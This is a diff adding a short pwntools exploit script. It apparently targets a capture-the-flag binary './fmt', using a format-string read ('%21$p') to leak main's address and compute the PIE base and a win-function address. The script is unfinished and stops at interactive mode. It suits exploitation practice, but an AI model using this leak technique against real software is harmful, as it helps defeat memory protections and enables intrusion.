@@ -1,0 +1,17 @@
+from pwn import *
+
+p = process("./fmt")
+
+leak = b"%21$p"
+p.sendlineafter(b"Give me secret number: ", leak)
+
+main = p.recvline()
+offset_main = 0x133F
+main = int(main, 16)
+print(main)
+
+offset_pie = main - offset_main
+offset_win = 0x401c + offset_pie
+
+p.interactive()
+
